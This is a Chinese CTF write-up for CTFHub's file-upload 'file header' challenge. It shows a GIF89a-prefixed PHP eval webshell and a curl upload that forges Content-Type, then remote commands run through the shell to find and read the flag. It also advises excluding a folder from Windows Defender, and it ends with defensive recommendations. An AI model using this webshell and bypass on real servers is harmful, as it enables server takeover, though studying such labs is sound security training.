---
title: CTFHub 文件上传 文件头检测
date: 2026-10-20
categories: CTFHub Web 文件上传
tags: CTFHub Web 文件上传
---

# 题目：CTFHub 文件上传 文件头检测

## 题目描述
打开题目页面，界面与之前的题类似。尝试直接上传 `shell.php`，页面提示：
`文件类型不正确，只允许上传 jpeg jpg png gif 类型的文件`
分析：
这题不仅校验了后缀名，还校验了文件内容（文件头/魔数）。服务器会读取文件的前几个字节，判断你是不是一张真实的图片。

## 解题思路
### 漏洞原理
文件头检测通常通过读取文件的前几个字节（如 GIF 的 `GIF89a`，JPG 的 `FF D8 FF`）来判断文件类型。
绕过思路：
1. 给 WebShell 加上图片的文件头（如 `GIF89a`）。
2. 伪造 HTTP 请求中的 `Content-Type`，骗过服务器。
3. 绕过图片处理库的“二次渲染”（防止代码被过滤）。

### 核心难点
- 前端 JS 会拦截 `.php` 后缀。
- 后端 OpenResty 会严格检查文件头。
- 如果伪造得不彻底，图片处理库（如 GD 库）会对图片进行二次渲染，把隐藏在图片尾部的 PHP 代码删掉。

## 解题步骤
### 1. 制作图片马
在本地新建 `shell.php`，写入以下内容（**`GIF89a` 后必须换行**）：
```php
GIF89a
<?php @eval($_POST['cmd']); ?> 
```
(**Windows Defender 可能会报毒拦截，需要新建一个 muma 文件夹并加入排除项。**)

### 2. 用 cURL 伪造 Content-Type 上传
因为前端限制，直接通过网页上传会被拦截。我们使用 CMD 的 cURL 命令，伪造 Content-Type 为 image/gif，同时保留文件名为 shell.php，从而绕过前端和文件头检测。
打开 CMD，执行以下命令：
```curl -X POST http://challenge-69b7ee2100e5fa34.sandbox.ctfhub.com:10800// -F "file=@C:\Users\25047\Desktop\muma\shell.php;type=image/gif;filename=shell.php" -F "submit=Submit"
```
返回结果：
提示 上传成功，路径为 upload/shell.php。
(关键点：保留 .php 后缀，但把 Content-Type 设置为 image/gif，既能绕过检测，又避免了图片二次渲染导致代码丢失。)

### 3. 连马并寻找 Flag
使用 curl -X POST 向木马发送命令。注意：必须用 POST，且 Content-Length 会自动计算，不要手动修改。

1. 测试木马是否生效：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('ls');"
```
(如果返回了文件列表，说明木马执行成功！)

2. 全盘搜索 flag 文件（注意 flag* 和 2> 之间必须有空格）：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('find / -name flag* 2>/dev/null');"
```
返回结果：
/var/www/html/flag_1466417679.php

3. 读取 flag 文件：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('cat /var/www/html/flag_1466417679.php');"
```
得出flag ctfhub{9d48bb859eae170c560395c8}

## 踩坑指南
1. 修改 HTML 源码被拦
尝试在 F12 里删掉 onsubmit 属性，上传 .php 时依然被后端拦截（提示“文件错误”）。这说明前端的检测只是幌子，真正的拦截在服务器端。

2. GIF89a 被二次渲染
直接上传带 GIF89a 头的 shell.jpg，虽然上传成功，但访问时发现 PHP 代码被删了，只剩下 GIF89a。这是因为服务器调用了图片处理库对图片进行了二次渲染。
**解决**： 使用 filename="shell.php" + type=image/gif 组合，既保住了 .php 后缀能被解析，又不会被图片库处理。

3. find 命令找不到 Flag
写成了 find / -name flag*2>/dev/null，导致没有空格，无法识别。
**解决**： 必须写成 find / -name flag* 2>/dev/null。

4. CMD 中复制多行 cURL 命令报错
从 F12 复制出来的 cURL 命令包含大量 ^ 换行符，直接贴到 CMD 会报 More? 或参数错误。
**解决**： 直接手打极简的 curl -X POST ... 命令，不复制那一长串环境变量。

## 知识点总结
1. 

| 知识点 | 说明 |
| :--- | :--- |
| 文件头检测 | 检查文件前几个字节（魔数），判断真实类型 |
| MIME 伪造 | 修改请求头中的 `Content-Type`，欺骗服务器 |
| 二次渲染 | 图片处理库对图片重新编码，导致恶意代码丢失 |
绕过二次渲染	保留 .php 后缀，只伪造 Content-Type 为图片

2. 防御建议
   1. 严格校验文件后缀：使用白名单，只允许特定后缀。
   2. 重命名文件：上传后强制重命名为随机字符串，并统一后缀。
   3. 分离存储：上传的文件存放在独立服务器或对象存储，与代码服务器隔离。
   4. 禁止上传目录解析脚本：在 Nginx/Apache 配置中禁止执行上传目录的 PHP。

